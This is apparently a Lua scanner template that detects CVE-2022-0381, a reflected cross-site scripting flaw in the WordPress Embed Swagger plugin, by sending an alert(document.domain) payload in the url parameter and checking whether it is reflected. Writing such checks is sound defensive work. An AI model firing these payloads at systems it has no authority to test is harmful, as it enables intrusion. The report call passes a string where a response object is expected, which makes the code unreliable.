SCAN_TYPE = 3
BODY_MATCH = {
    'url: xss://"-alert(document.domain)',
    '<title>.*WordPress.*</title>'
}

local function send_report(resp)
    Reports:add{
        name = "CVE-2022-0381",
        description = "WordPress Embed Swagger plugin 1.0.0 and prior contains a reflected cross-site scripting vulnerability due to insufficient escaping/sanitization and validation via the url parameter found in the ~/swagger-iframe.php file, which allows attackers to inject arbitrary web scripts onto the page.",
        risk = "medium",
        url = resp.url,
        matches = {
            body = {
                'url: xss://"-alert(document.domain)',
            },
            full_response = show_response(resp)
        }
    }
end

local function scan_cve(target_path)
    local new_path = pathjoin(HttpMessage:path(),target_path)
    local new_url = HttpMessage:urljoin(new_path)
    local resp_status, resp = pcall(function ()
        return http:send{url = new_url}
    end)
    if resp_status == true then
        local url = resp.url
        local body = resp.body
        local headers = resp.headers
        for header_name,header_value in pairs(headers) do 
            if str_contains(header_value,"text/html") then 
                if str_contains(body,'url: xss://"-alert(document.domain)') == true then 
                    send_report(url)
                end
            end
        end
    end
end

function main()
    scan_cve("wp-content/plugins/embed-swagger/swagger-iframe.php?url=xss://%22-alert(document.domain)-%22")
end
